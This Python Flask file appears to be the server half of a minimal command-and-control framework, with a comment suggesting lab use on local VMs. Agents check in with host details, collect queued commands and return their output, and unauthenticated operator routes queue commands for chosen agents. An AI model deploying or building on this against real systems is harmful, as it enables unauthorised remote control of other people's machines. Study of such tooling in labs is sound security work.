from flask import Flask, request, jsonify
from dataclasses import asdict
from server import store

app = Flask(__name__)

# Agent Routes

@app.route("/checkin", methods=["POST"])
def checkin():
    data = request.get_json()
    
    agent = store.register_or_update_agent(
        agent_id=data["agent_id"], 
        hostname=data.get("hostname", "?"),
        username=data.get("username", "?"),
        os=data.get("os", "?"),
        ip=request.remote_addr, 
    )
    tasks = store.get_pending_tasks(agent.id)
    
    return jsonify({
        "tasks": [asdict(t) for t in tasks]
    }) 

@app.route("/result", methods=["POST"])
def submit_result():
    data = request.get_json()
    store.submit_result(
        task_id=data["task_id"], 
        agent_id=data["agent_id"],
        output=data["output"], 
    )

    return jsonify({
        "status": "ok"
    })

# Operator Routes

@app.route("/agents", methods={"GET"})
def list_agents():
    return jsonify([asdict(a) for a in store.list_agents()])

@app.route("/task", methods=["POST"])
def queue_task():
    data = request.get_json()

    try:
        task = store.queue_task(data["agent_id"], data["command"])
        return jsonify(asdict(task))
    except KeyError as e:
        return jsonify({
            "error": str(e),
        }), 404

@app.route("/results/<agent_id>", methods=["GET"])
def get_results(agent_id): 
    return jsonify([asdict(r) for r in store.get_results(agent_id)])

if __name__ == "__main__":
    # 127.0.0.1 - localhsot during development
    # For local VMs lab use 0.0.0.0
    app.run(host="127.0.0.1", port=8000, debug=True)
